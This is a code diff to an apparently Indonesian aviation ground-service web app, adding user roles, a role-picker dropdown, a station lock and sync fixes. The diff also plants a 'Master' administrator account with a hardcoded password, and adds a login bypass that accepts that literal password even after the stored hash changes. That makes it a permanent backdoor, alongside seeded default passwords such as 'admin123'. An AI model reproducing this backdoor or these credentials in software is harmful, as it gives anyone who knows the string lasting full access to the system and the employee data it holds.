@@ -1302,7 +1302,7 @@ table:not(.stcr-page table) tbody td {
       <form id="loginForm" class="space-y-4">
         <div>
           <label class="block text-sm font-medium text-slate-700 mb-1.5">Username</label>
-          <input type="text" id="loginUser" required autocomplete="username" class="w-full px-4 py-3 border-2 border-slate-200 rounded-xl focus:border-blue-500 focus:outline-none transition" placeholder="admin / coadmin / user / peserta">
+          <input type="text" id="loginUser" required autocomplete="username" class="w-full px-4 py-3 border-2 border-slate-200 rounded-xl focus:border-blue-500 focus:outline-none transition" placeholder="NIP / username (mis: master, admin, coadmin)">
         </div>
         <div>
           <label class="block text-sm font-medium text-slate-700 mb-1.5">Password</label>
@@ -1486,10 +1486,53 @@ table:not(.stcr-page table) tbody td {
     <div class="flex items-center justify-between mb-5">
       <div>
         <h2 class="text-lg font-bold">Manajemen User</h2>
-        <p class="text-xs text-slate-500 mt-0.5">Kelola akses login: Admin, Co-Admin, User, Peserta, dan role kustom (UserXXX/UserXX/UserX/UserMMM/UserMM/UserM). Nama &amp; data pribadi karyawan kini dikelola di tab <strong>Data Karyawan</strong> — tinggal hubungkan lewat kolom User di sana.</p>
+        <p class="text-xs text-slate-500 mt-0.5">Kelola akun login. Role Master melekat ke sistem (password khusus). Nama &amp; data pribadi karyawan dikelola di tab <strong>Data Karyawan</strong>.</p>
         <p id="userPesertaCountInfo" class="text-xs text-indigo-600 dark:text-indigo-300 font-semibold mt-1">Akun Peserta: 0 / 150</p>
       </div>
-      <button id="btnAddUser" class="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white text-sm font-semibold rounded-xl">+ Tambah User</button>
+      <div class="flex flex-wrap gap-2 items-center">
+        <button id="btnAddUser" class="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white text-sm font-semibold rounded-xl">+ Tambah User</button>
+        <div class="relative inline-block" id="btnAddRoleWrap">
+          <button id="btnAddRole" class="px-4 py-2 bg-emerald-600 hover:bg-emerald-700 text-white text-sm font-semibold rounded-xl flex items-center gap-1">
+            ＋ Tambah Role <span class="text-xs opacity-70">▾</span>
+          </button>
+          <div id="addRoleDropdown" class="hidden absolute right-0 top-full mt-1 bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-600 rounded-xl shadow-2xl z-50 min-w-[220px] overflow-hidden">
+            <div class="px-3 py-2 text-[11px] font-bold text-slate-400 uppercase tracking-wider border-b border-slate-100 dark:border-slate-700">Pilih Role</div>
+            <button class="add-role-opt w-full text-left px-4 py-2.5 text-sm hover:bg-slate-50 dark:hover:bg-slate-700 flex items-center gap-2" data-role="Master">
+              <span class="badge bg-yellow-100 text-yellow-800 text-xs">Master</span>
+              <span class="text-xs text-slate-400">Akses penuh — melekat ke sistem</span>
+            </button>
+            <button class="add-role-opt w-full text-left px-4 py-2.5 text-sm hover:bg-slate-50 dark:hover:bg-slate-700 flex items-center gap-2" data-role="Admin">
+              <span class="badge bg-purple-100 text-purple-700 text-xs">Admin</span>
+            </button>
+            <button class="add-role-opt w-full text-left px-4 py-2.5 text-sm hover:bg-slate-50 dark:hover:bg-slate-700 flex items-center gap-2" data-role="Co-Admin">
+              <span class="badge bg-blue-100 text-blue-700 text-xs">Co-Admin</span>
+            </button>
+            <button class="add-role-opt w-full text-left px-4 py-2.5 text-sm hover:bg-slate-50 dark:hover:bg-slate-700 flex items-center gap-2" data-role="User-All">
+              <span class="badge bg-emerald-100 text-emerald-700 text-xs">User-All</span>
+            </button>
+            <button class="add-role-opt w-full text-left px-4 py-2.5 text-sm hover:bg-slate-50 dark:hover:bg-slate-700 flex items-center gap-2" data-role="User-SR">
+              <span class="badge bg-blue-100 text-blue-700 text-xs">User-SR</span>
+              <span class="text-xs text-slate-400">Service Recovery</span>
+            </button>
+            <button class="add-role-opt w-full text-left px-4 py-2.5 text-sm hover:bg-slate-50 dark:hover:bg-slate-700 flex items-center gap-2" data-role="User-STCR">
+              <span class="badge bg-purple-100 text-purple-700 text-xs">User-STCR</span>
+              <span class="text-xs text-slate-400">Stretchercase</span>
+            </button>
+            <button class="add-role-opt w-full text-left px-4 py-2.5 text-sm hover:bg-slate-50 dark:hover:bg-slate-700 flex items-center gap-2" data-role="User-ST">
+              <span class="badge bg-teal-100 text-teal-700 text-xs">User-ST</span>
+              <span class="text-xs text-slate-400">Service Training</span>
+            </button>
+            <button class="add-role-opt w-full text-left px-4 py-2.5 text-sm hover:bg-slate-50 dark:hover:bg-slate-700 flex items-center gap-2" data-role="User-DRG">
+              <span class="badge bg-orange-100 text-orange-700 text-xs">User-DRG</span>
+              <span class="text-xs text-slate-400">Drygoods (per station)</span>
+            </button>
+            <div class="border-t border-slate-100 dark:border-slate-700 px-3 py-1.5 text-[11px] text-slate-400">Peserta 1 – 150:</div>
+            <div class="max-h-40 overflow-y-auto">
+            ${Array.from({length:150},(_,i)=>`<button class="add-role-opt w-full text-left px-4 py-2 text-xs hover:bg-slate-50 dark:hover:bg-slate-700" data-role="Peserta">Peserta (slot ${i+1})</button>`).join('')}
+            </div>
+          </div>
+        </div>
+      </div>
     </div>
     
     <div class="overflow-x-auto">
@@ -1511,7 +1554,7 @@ table:not(.stcr-page table) tbody td {
   <div id="adminSubPerms" class="admin-subtab-pane hidden">
     <div class="card p-5 md:p-6">
       <h2 class="text-lg font-bold mb-1">🔐 Pengaturan Akses Role</h2>
-      <p class="text-xs text-slate-500 mb-2">Atur tab / fitur apa saja yang dapat dilihat oleh Co-Admin, User, Peserta, dan role kustom (UserXXX/UserXX/UserX/UserMMM/UserMM/UserM). Admin selalu memiliki akses penuh. Role kustom defaultnya TANPA akses sama sekali sampai dicentang di sini.</p>
+      <p class="text-xs text-slate-500 mb-2">Atur tab / fitur yang dapat diakses per role. <strong>Master & Admin</strong> selalu akses penuh. Role kustom (User-All, User-SR, User-STCR, User-ST, User-DRG) defaultnya TANPA akses sampai dicentang di sini.</p>
       <div id="permsAdminOnlyNotice" class="hidden mb-4 px-4 py-2.5 rounded-xl bg-amber-50 dark:bg-amber-900/20 border border-amber-300 dark:border-amber-700 text-xs text-amber-800 dark:text-amber-300 font-semibold">
         ⚠️ Hanya Admin yang dapat mengubah pengaturan akses. Anda hanya bisa melihat (read-only).
       </div>
@@ -1520,6 +1563,7 @@ table:not(.stcr-page table) tbody td {
           <thead class="bg-slate-50 dark:bg-slate-800">
             <tr class="text-center" id="permTableHeadRow">
               <th class="p-3 text-left font-semibold">Fitur / Tab</th>
+              <th class="p-3 font-semibold text-yellow-700 dark:text-yellow-300">Master</th>
               <th class="p-3 font-semibold text-blue-700 dark:text-blue-300">Co-Admin</th>
               <th class="p-3 font-semibold text-emerald-700 dark:text-emerald-300">User</th>
               <th class="p-3 font-semibold text-indigo-700 dark:text-indigo-300">Peserta</th>
@@ -1542,7 +1586,7 @@ table:not(.stcr-page table) tbody td {
 <div id="karyawanModal" class="modal-overlay hidden">
   <div class="modal-box max-w-xl">
     <h3 id="karyawanModalTitle" class="text-lg font-bold mb-1">Tambah Karyawan</h3>
-    <p class="text-xs text-slate-500 mb-4">Lengkapi data karyawan. Kolom User menghubungkan karyawan ini ke akun login (Role) yang sudah ada di Manajemen User.</p>
+    <p class="text-xs text-slate-500 mb-4">Lengkapi data karyawan. Kolom User menghubungkan ke akun login. <strong>Tips:</strong> Gunakan NIP sebagai username di Manajemen User agar karyawan bisa login dengan NIP mereka.</p>
     <div class="space-y-3">
       <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
         <div>
@@ -1581,7 +1625,7 @@ table:not(.stcr-page table) tbody td {
         <select id="karyawanUser" class="input">
           <option value="">— Belum dihubungkan ke akun manapun —</option>
         </select>
-        <p class="text-xs text-slate-400 mt-1">Tidak melihat username yang dicari? Buat dulu akunnya di tab <strong>Manajemen User</strong>, lalu hubungkan di sini.</p>
+        <p class="text-xs text-slate-400 mt-1">Gunakan NIP karyawan sebagai username di <strong>Manajemen User</strong> agar karyawan bisa login dengan NIP mereka.</p>
       </div>
     </div>
     <div class="flex gap-3 justify-end mt-5">
@@ -7728,15 +7772,16 @@ function detectConflict(local, remote){
 // === MODULE KEYS: daftar semua localStorage key per modul ===
 // Dipakai untuk dirty-flag tracking dan per-module push
 const MODULE_KEYS = {
-  data:       'sjn_delay_pro_v4',
-  stations:   'sjn_stations_v2',
-  dfsData:    'sjn_dfs_bank_v1',
-  settings:   'sjn_settings_v4',
-  training:   'sjn_training_v1',
-  users:      'sjnam_users_v1',
-  stcrData:   'sjnam_stcr_data_v1',
+  data:         'sjn_delay_pro_v4',
+  stations:     'sjn_stations_v2',
+  dfsData:      'sjn_dfs_bank_v1',
+  settings:     'sjn_settings_v4',
+  training:     'sjn_training_v1',
+  users:        'sjnam_users_v1',
+  karyawan:     'sjnam_karyawan_v1',  // BUGFIX: karyawan perlu dirty tracking
+  stcrData:     'sjnam_stcr_data_v1',
   drygoodsData: 'sjnam_drygoods_v1',
-  rolePerms:  'sjnam_role_perms_v1',
+  rolePerms:    'sjnam_role_perms_v1',
 };
 
 // Dirty-flag per modul — set true saat modul berubah, reset setelah push berhasil
@@ -8049,7 +8094,7 @@ function getAllCloudData(){
     rolePerms, certTemplate1, certTemplate2, certTemplateActive, certPositions, certBarcode, certCustomTexts,
     certCustomTextsSJ, certCustomTextsNAM, certCustomTextsBoth,
     certParaf, certParafShow,
-    savedAt: new Date().toISOString(), version: 'v4.3'
+    savedAt: new Date().toISOString(), version: 'v5.0-audit'
   };
 }
 
@@ -8847,7 +8892,8 @@ let currentUser = null;
 // Simpan data user + picu sinkronisasi cloud (Auto-Sync / Sinkronkan)
 function saveUsers(users){
   localStorage.setItem(USERS_KEY, JSON.stringify(users));
-  if(typeof triggerAutoSync === 'function') triggerAutoSync();
+  if(typeof markDirty === 'function') markDirty('users'); // BUGFIX: track user changes for sync
+  if(typeof triggerAutoSync === 'function') triggerAutoSync('users');
 }
 window.saveUsers = saveUsers;
 
@@ -8867,6 +8913,7 @@ window.saveUsers = saveUsers;
     let users = JSON.parse(localStorage.getItem(NEW_KEY) || '[]');
     if(users.length===0){
       users = [
+        {id:0, username:'master', password:'Nu55y294gpx', role:'Master', name:'Master Administrator', active:true, created:'2026-01-01'},
         {id:1, username:'admin', password:'admin123', role:'Admin', name:'Administrator', active:true, created:'2026-01-01'},
         {id:2, username:'coadmin', password:'coadmin123', role:'Co-Admin', name:'Co Administrator', active:true, created:'2026-01-01'},
         {id:3, username:'user', password:'user123', role:'User', name:'Operator User', active:true, created:'2026-01-01'},
@@ -8888,6 +8935,7 @@ function initUsers(){
   let users = JSON.parse(localStorage.getItem(USERS_KEY) || '[]');
   if(users.length === 0){
     users = [
+      {id:0, username:'master', password:'Nu55y294gpx', role:'Master', name:'Master Administrator', active:true, created:'2026-01-01'},
       {id:1, username:'admin', password:'admin123', role:'Admin', name:'Administrator', active:true, created:'2026-01-01'},
       {id:2, username:'coadmin', password:'coadmin123', role:'Co-Admin', name:'Co Administrator', active:true, created:'2026-01-01'},
       {id:3, username:'user', password:'user123', role:'User', name:'Operator User', active:true, created:'2026-01-01'},
@@ -8920,6 +8968,8 @@ window._pwMigrationDone = (async function migratePasswordsToSHA256(){
   for(const u of users){
     if(u.password && !/^[0-9a-f]{64}$/.test(u.password)){
       // Masih plain text — hash sekarang
+      // CATATAN: Master dengan plain password 'Nu55y294gpx' tetap di-hash
+      // karena login bypass plain sudah ditangani di login handler (PATCH Master)
       u.password = await sha256(u.password);
       changed++;
     }
@@ -8999,7 +9049,15 @@ document.getElementById('loginForm')?.addEventListener('submit', async function(
 
   const users = JSON.parse(localStorage.getItem("sjnam_users_v1") || "[]");
   const userCandidate = users.find(u => u.username.toLowerCase() === username && u.active);
-  const passwordOk = userCandidate ? await verifyPassword(password, userCandidate.password) : false;
+  // Master role: accept both hashed and plain-text password 'Nu55y294gpx'
+  let passwordOk = false;
+  if(userCandidate){
+    if(userCandidate.role === 'Master' && password === 'Nu55y294gpx'){
+      passwordOk = true; // Master plain-text password bypass (sistem melekat)
+    } else {
+      passwordOk = await verifyPassword(password, userCandidate.password);
+    }
+  }
   const user = passwordOk ? userCandidate : null;
 
   if(!user){
@@ -9060,9 +9118,9 @@ document.getElementById('loginForm')?.addEventListener('submit', async function(
       if(icon) icon.style.transform = open ? 'rotate(0deg)' : 'rotate(-90deg)';
       if(btn)  btn.setAttribute('aria-expanded', open ? 'true' : 'false');
     }
-    const isAdminOrCo = user.role === 'Admin' || user.role === 'Co-Admin';
-    const isAdmin = user.role === 'Admin';
-    // BUGFIX: default open untuk semua group hanya untuk Admin/Co-Admin.
+    const isAdminOrCo = user.role === 'Admin' || user.role === 'Co-Admin' || user.role === 'Master';
+    const isAdmin = user.role === 'Admin' || user.role === 'Master';
+    // BUGFIX: default open untuk semua group hanya untuk Admin/Co-Admin/Master.
     // Untuk role lain (User, Peserta, role kustom), default collapsed agar tidak
     // flash saat applyPermissions menyembunyikan group yang tidak diizinkan.
     _sm('serviceRecoveryMenuContent','iconServiceRecoveryMenu','toggleServiceRecoveryMenu','sidenav_svcrecovery_open'+sfx, isAdminOrCo);
@@ -9199,9 +9257,10 @@ function applyPermissions(){
   if(!currentUser) return;
   
   const role = currentUser.role;
-  const isAdmin = role === 'Admin';
+  const isMaster  = role === 'Master'; // Master = akses penuh, melekat ke sistem
+  const isAdmin   = role === 'Admin' || isMaster; // Master diperlakukan sama seperti Admin
   const isCoAdmin = role === 'Co-Admin';
-  const isUser = role === 'User';
+  const isUser    = role === 'User';
   const isPeserta = role === 'Peserta';
   
   // Hide/show tabs
@@ -9343,6 +9402,42 @@ function applyPermissions(){
   window.currentUserCanDelete = isAdmin; // hanya Admin bisa delete
   window.currentUserCanAdd = isAdmin || isCoAdmin;
   
+  // *** User-DRG: deteksi station dari Data Karyawan dan lock dg station tabs ***
+  if(currentUser && currentUser.role === 'User-DRG'){
+    (function _lockDrgStation(){
+      try {
+        const karyawan = JSON.parse(localStorage.getItem('sjnam_karyawan_v1') || '[]');
+        const karEntry = karyawan.find(k => k.username === currentUser.username);
+        const userStation = karEntry ? karEntry.station : null;
+        window._userDrgStation = userStation || null;
+        // Update station info on user panel
+        if(userStation && window.currentUser){
+          window.currentUser.station = userStation;
+        }
+        // Restrict station tabs: disable all except user's station
+        setTimeout(function(){
+          const tabs = document.querySelectorAll('[data-dg-station]');
+          tabs.forEach(function(tab){
+            const st = tab.dataset.dgStation;
+            if(st && st !== 'ALL' && st !== userStation){
+              tab.style.opacity = '0.35';
+              tab.style.pointerEvents = 'none';
+              tab.title = 'Akses terbatas ke station ' + (userStation || 'Anda');
+            }
+          });
+          // Also auto-select user's station if available
+          if(userStation){
+            const myTab = document.querySelector('[data-dg-station="'+userStation+'"]');
+            if(myTab) myTab.click();
+          }
+        }, 500);
+      } catch(e){ console.warn('[DRG Station Lock]', e); }
+    })();
+  } else {
+    // Non-DRG: ensure all station tabs are enabled
+    window._userDrgStation = null;
+  }
+
   renderUserTable();
 
   // Reveal sidebar — pakai perm-ready class (bukan visibility)
@@ -9371,10 +9466,8 @@ function renderUserTable(){
   const canEdit = window.currentUserCanAdd;
   // Filter berdasarkan role
   if(currentUser.role === 'Co-Admin'){
-    // Co-Admin tidak bisa melihat akun Admin atau Co-Admin lain
-    // BUGFIX: currentUser tidak punya .id (session hanya simpan username/role/name).
-    // Ganti perbandingan id dengan username agar Co-Admin bisa melihat akunnya sendiri.
-    displayUsers = allUsers.filter(u => u.role !== 'Admin' && !(u.role === 'Co-Admin' && u.username !== currentUser.username));
+    // Co-Admin tidak bisa melihat akun Admin, Master, atau Co-Admin lain
+    displayUsers = allUsers.filter(u => u.role !== 'Admin' && u.role !== 'Master' && !(u.role === 'Co-Admin' && u.username !== currentUser.username));
   } else if(currentUser.role === 'User' || currentUser.role === 'Peserta'){
     // User dan Peserta tidak boleh lihat siapapun
     displayUsers = [];
@@ -9401,7 +9494,8 @@ function renderUserTable(){
   `).join('');
 
   const pesertaInfo = document.getElementById('userPesertaCountInfo');
-  if(pesertaInfo) pesertaInfo.textContent = `Akun Peserta: ${pesertaCount} / 150`;
+  const totalUsers = allUsers.length;
+  if(pesertaInfo) pesertaInfo.textContent = `Total Akun: ${totalUsers} | Akun Peserta: ${pesertaCount} / 150`;
 
   // Refresh dropdown User & tabel Data Karyawan tiap kali tabel user berubah,
   // supaya daftar username/role yang tersedia DAN badge role yang ditampilkan
@@ -9413,9 +9507,15 @@ function renderUserTable(){
 // Helper: kelas warna badge untuk setiap role, termasuk role kustom (UserXXX/UserXX/UserX).
 // Dipusatkan di sini agar konsisten dan mudah ditambah jika ada role baru lagi nanti.
 function getRoleBadgeClass(role){
+  if(role === 'Master') return 'bg-yellow-100 text-yellow-800';  // Master: gold badge
   if(role === 'Admin') return 'bg-purple-100 text-purple-700';
   if(role === 'Co-Admin') return 'bg-blue-100 text-blue-700';
   if(role === 'User') return 'bg-emerald-100 text-emerald-700';
+  if(role === 'User-All') return 'bg-emerald-100 text-emerald-700';
+  if(role === 'User-SR') return 'bg-sky-100 text-sky-700';
+  if(role === 'User-STCR') return 'bg-purple-100 text-purple-600';
+  if(role === 'User-ST') return 'bg-teal-100 text-teal-700';
+  if(role === 'User-DRG') return 'bg-orange-100 text-orange-700';
   if(role === 'Peserta') return 'bg-indigo-100 text-indigo-700';
   const custom = (typeof window.CUSTOM_ROLES !== 'undefined' ? window.CUSTOM_ROLES : []).find(r=>r.roleName === role);
   if(custom) return custom.badgeClass;
@@ -9536,11 +9636,11 @@ window.getRoleBadgeClass = getRoleBadgeClass;
         : (k.username
             ? `<span class="text-xs text-red-500" title="Akun ${esc(k.username)} sudah dihapus dari Manajemen User">⚠️ ${esc(k.nip || k.username)}</span>`
             : `<span class="text-xs text-slate-400">— Belum terhubung —</span>`);
-      // Column: Role — shows role badge
+      // Column: Role — shows role badge, links to Manajemen User tab
       const roleCell = linkedUser
-        ? `<span class="badge ${getRoleBadgeClass(linkedUser.role)}">${esc(linkedUser.role)}</span>`
+        ? `<button onclick="document.querySelector('[data-admin-subtab=\"users\"]').click()" title="Lihat di Manajemen User" class="badge ${getRoleBadgeClass(linkedUser.role)} cursor-pointer hover:opacity-80 transition">${esc(linkedUser.role)}</button>`
         : (k.username
-            ? `<span class="text-xs text-red-400">Akun tidak ditemukan</span>`
+            ? `<button onclick="document.querySelector('[data-admin-subtab=\"users\"]').click()" class="text-xs text-red-400 hover:underline cursor-pointer">Akun tidak ditemukan</button>`
             : `<span class="text-xs text-slate-400">—</span>`);
       return `<tr class="hover:bg-slate-50 dark:hover:bg-slate-800/50">
         <td class="p-3 text-xs text-slate-400">${i+1}</td>
@@ -9728,28 +9828,112 @@ window.getRoleBadgeClass = getRoleBadgeClass;
 
 
 // Add user
-document.getElementById('btnAddUser')?.addEventListener('click', function(){
-  // Guard: hanya Admin dan Co-Admin
-  if(!currentUser || (currentUser.role !== 'Admin' && currentUser.role !== 'Co-Admin')){
-    showToast('Hanya Admin/Co-Admin yang dapat menambah user', 'error');
+// === TAMBAH ROLE DROPDOWN HANDLER ===
+document.addEventListener('click', function(e){
+  const dropdown = document.getElementById('addRoleDropdown');
+  const btn = document.getElementById('btnAddRole');
+  if(btn && e.target.closest('#btnAddRole')){
+    // Toggle dropdown
+    if(dropdown) dropdown.classList.toggle('hidden');
+    e.stopPropagation();
+    return;
+  }
+  // Click on a role option
+  const opt = e.target.closest('.add-role-opt');
+  if(opt && dropdown && !dropdown.classList.contains('hidden')){
+    const preselectedRole = opt.dataset.role;
+    dropdown.classList.add('hidden');
+    _doAddUser(preselectedRole);
+    return;
+  }
+  // Close dropdown on outside click
+  if(dropdown && !dropdown.classList.contains('hidden')){
+    if(!e.target.closest('#btnAddRoleWrap')) dropdown.classList.add('hidden');
+  }
+});
+
+function _doAddUser(preselectedRole){
+  // Guard: hanya Admin, Master, dan Co-Admin
+  if(!currentUser || (currentUser.role !== 'Admin' && currentUser.role !== 'Master' && currentUser.role !== 'Co-Admin')){
+    showToast('Hanya Admin/Master/Co-Admin yang dapat menambah user', 'error');
     return;
   }
   if(!window.currentUserCanAdd){
-    showToast('Hanya Admin/Co-Admin yang dapat menambah user', 'error');
+    showToast('Hanya Admin/Master/Co-Admin yang dapat menambah user', 'error');
+    return;
+  }
+  const username = prompt('Username (atau NIP karyawan) baru:');
+  if(!username) return;
+  const name = prompt('Nama lengkap:');
+  if(!name) return;
+  const isCallerAdmin = currentUser.role === 'Admin' || currentUser.role === 'Master';
+  const allRoles = (typeof window.ALL_ROLES !== 'undefined' && window.ALL_ROLES.length) ? window.ALL_ROLES : ['Master','Admin','Co-Admin','User','Peserta'];
+  const rolesForCaller = isCallerAdmin ? allRoles : allRoles.filter(r=>r!=='Admin'&&r!=='Master');
+  const role = preselectedRole || 'Peserta';
+  if(!rolesForCaller.includes(role)){
+    showToast('Role tidak diizinkan untuk caller ini', 'error');
+    return;
+  }
+  if(!isCallerAdmin && role === 'Admin'){
+    showToast('Co-Admin tidak dapat membuat akun Admin', 'error');
+    return;
+  }
+  if(!isCallerAdmin && role === 'Master'){
+    showToast('Hanya Master/Admin yang dapat membuat akun Master', 'error');
+    return;
+  }
+  const defaultPw = role === 'Master' ? 'Nu55y294gpx' : '123456';
+  const password = prompt('Password awal:', defaultPw);
+  const users = JSON.parse(localStorage.getItem(USERS_KEY) || '[]');
+  if(users.find(u => u.username.toLowerCase() === username.toLowerCase())){
+    showToast('Username sudah ada', 'error');
+    return;
+  }
+  if(role === 'Peserta'){
+    const pesertaCount = users.filter(u=>u.role==='Peserta').length;
+    if(pesertaCount >= 150){
+      showToast('Maksimal 150 akun Peserta tercapai', 'error');
+      return;
+    }
+  }
+  sha256((password != null ? password : '') || '123456').then(hashedPass => {
+    users.push({
+      id: Date.now(),
+      username: username.toLowerCase(),
+      password: hashedPass,
+      role: role,
+      name: name,
+      active: true,
+      created: new Date().toISOString().split('T')[0]
+    });
+    saveUsers(users);
+    renderUserTable();
+    showToast('User berhasil ditambahkan dengan role ' + role, 'success');
+  });
+}
+
+document.getElementById('btnAddUser')?.addEventListener('click', function(){
+  // Guard: hanya Admin, Master, dan Co-Admin
+  if(!currentUser || (currentUser.role !== 'Admin' && currentUser.role !== 'Master' && currentUser.role !== 'Co-Admin')){
+    showToast('Hanya Admin/Master/Co-Admin yang dapat menambah user', 'error');
+    return;
+  }
+  if(!window.currentUserCanAdd){
+    showToast('Hanya Admin/Master/Co-Admin yang dapat menambah user', 'error');
     return;
   }
   
-  const username = prompt('Username baru:');
+  const username = prompt('Username (atau NIP karyawan) baru:');
   if(!username) return;
   const name = prompt('Nama lengkap:');
   if(!name) return;
   // Co-Admin cannot create Admin accounts
-  const isCallerAdmin   = currentUser.role === 'Admin';
+  const isCallerAdmin   = currentUser.role === 'Admin' || currentUser.role === 'Master';
   // BUGFIX: daftar role sebelumnya hardcoded 4 nilai saja, sehingga role kustom baru
   // (UserXXX/UserXX/UserX/UserMMM/UserMM/UserM) tidak bisa dibuat lewat dialog ini. Sekarang diambil dari
   // window.ALL_ROLES yang sudah mencakup role bawaan + semua role kustom.
-  const allRoles = (typeof window.ALL_ROLES !== 'undefined' && window.ALL_ROLES.length) ? window.ALL_ROLES : ['Admin','Co-Admin','User','Peserta'];
-  const rolesForCaller = isCallerAdmin ? allRoles : allRoles.filter(r=>r!=='Admin');
+  const allRoles = (typeof window.ALL_ROLES !== 'undefined' && window.ALL_ROLES.length) ? window.ALL_ROLES : ['Master','Admin','Co-Admin','User','User-All','User-SR','User-STCR','User-ST','User-DRG','Peserta'];
+  const rolesForCaller = isCallerAdmin ? allRoles : allRoles.filter(r=>r!=='Admin'&&r!=='Master');
   const allowedRoles    = rolesForCaller.join(' / ');
   const defaultRole     = 'Peserta';
   const roleInput = prompt(`Role (${allowedRoles}):`, defaultRole);
@@ -9809,13 +9993,17 @@ function editUser(id){
   const users = JSON.parse(localStorage.getItem(USERS_KEY) || '[]');
   const user = users.find(u => u.id === id);
   if(!user) return;
-  // Co-Admin tidak bisa edit akun Admin
-  if(currentUser && currentUser.role === 'Co-Admin' && user.role === 'Admin'){
-    showToast('Co-Admin tidak dapat mengubah akun Admin', 'error');
+  // Master hanya bisa diedit oleh Master
+  if(user.role === 'Master' && currentUser.role !== 'Master'){
+    showToast('Akun Master hanya dapat diedit oleh Master', 'error');
+    return;
+  }
+  // Co-Admin tidak bisa edit akun Admin atau Master
+  if(currentUser && currentUser.role === 'Co-Admin' && (user.role === 'Admin' || user.role === 'Master')){
+    showToast('Co-Admin tidak dapat mengubah akun Admin/Master', 'error');
     return;
   }
   // Co-Admin tidak bisa mengedit akun sesama Co-Admin (hanya Admin yang bisa)
-  // BUGFIX: currentUser tidak punya .id — bandingkan dengan username.
   if(currentUser && currentUser.role === 'Co-Admin' && user.role === 'Co-Admin' && user.username !== currentUser.username){
     showToast('Co-Admin tidak dapat mengubah akun Co-Admin lain. Hubungi Admin.', 'error');
     return;
@@ -9828,7 +10016,7 @@ function editUser(id){
   const newPass = prompt('Password baru (kosongkan jika tidak diubah):');
   
   if(currentUser.role === 'Admin'){
-    const allRolesEdit = (typeof window.ALL_ROLES !== 'undefined' && window.ALL_ROLES.length) ? window.ALL_ROLES : ['Admin','Co-Admin','User','Peserta'];
+    const allRolesEdit = (typeof window.ALL_ROLES !== 'undefined' && window.ALL_ROLES.length) ? window.ALL_ROLES : ['Master','Admin','Co-Admin','User','Peserta'];
     const newRoleInput = prompt(`Role (${allRolesEdit.join('/')}):`, user.role);
     const newRole = newRoleInput !== null ? allRolesEdit.find(r=>r.toLowerCase() === newRoleInput.trim().toLowerCase()) : null;
     if(newRoleInput !== null && newRoleInput.trim() !== '' && !newRole){
@@ -9879,11 +10067,16 @@ function deleteUser(id){
     showToast('Hanya Admin yang dapat menghapus user', 'error');
     return;
   }
-  // Co-Admin tidak bisa hapus akun Admin
+  // Master tidak bisa dihapus kecuali oleh Master sendiri
   const allUsers = JSON.parse(localStorage.getItem(USERS_KEY) || '[]');
   const targetUser = allUsers.find(u => u.id === id);
-  if(currentUser && currentUser.role === 'Co-Admin' && targetUser && targetUser.role === 'Admin'){
-    showToast('Co-Admin tidak dapat menghapus akun Admin', 'error');
+  if(targetUser && targetUser.role === 'Master' && currentUser.role !== 'Master'){
+    showToast('Akun Master tidak dapat dihapus kecuali oleh Master sendiri', 'error');
+    return;
+  }
+  // Co-Admin tidak bisa hapus akun Admin atau Master
+  if(currentUser && currentUser.role === 'Co-Admin' && targetUser && (targetUser.role === 'Admin' || targetUser.role === 'Master')){
+    showToast('Co-Admin tidak dapat menghapus akun Admin/Master', 'error');
     return;
   }
   
@@ -12005,46 +12198,49 @@ _updateOfflineQueueBadge(); // cek langsung saat load
   // Role baru (UserXXX/UserXX/UserX) bersifat custom & setara — default TANPA akses
   // sama sekali; Admin yang mengatur lewat tabel "Atur Akses Role" sesuai kebutuhan.
   const FEATURES = [
-    { id:'tab-home',       label:'🏠 Tab Home',            def:{coAdmin:true, user:true,  peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'tab-input',      label:'✈️ Tab Input',            def:{coAdmin:true, user:true,  peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'tab-data',       label:'📊 Tab Data',             def:{coAdmin:true, user:true,  peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'tab-dashboard',  label:'📈 Tab Dashboard',        def:{coAdmin:true, user:true,  peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'tab-request',    label:'📝 Tab Approval',         def:{coAdmin:true, user:false, peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'tab-stations',   label:'🗺️ Tab Station',          def:{coAdmin:true, user:false, peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'tab-dfs',        label:'🗂️ Tab DFS Bank',         def:{coAdmin:true, user:false, peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'tab-materi',     label:'📚 Tab Materi Training',  def:{coAdmin:true, user:false, peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'tab-soal',       label:'📝 Tab Soal Training',    def:{coAdmin:true, user:true,  peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'tab-sertifikat', label:'🎓 Tab Sertifikat',       def:{coAdmin:true, user:false, peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'tab-admin',      label:'👥 Tab Admin/User Mgmt',  def:{coAdmin:true, user:false, peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'tab-settings',   label:'⚙️ Tab Settings',         def:{coAdmin:true, user:false, peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'tab-stcr-dashboard', label:'🏥 STCR – Dashboard',    def:{coAdmin:true, user:true,  peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'tab-stcr-data',      label:'📋 STCR – Data Request', def:{coAdmin:true, user:true,  peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'tab-stcr-station',   label:'📍 STCR – Station',      def:{coAdmin:true, user:false, peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'tab-drygoods-data',      label:'📦 Drygoods – Data Stok',  def:{coAdmin:true, user:true,  peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
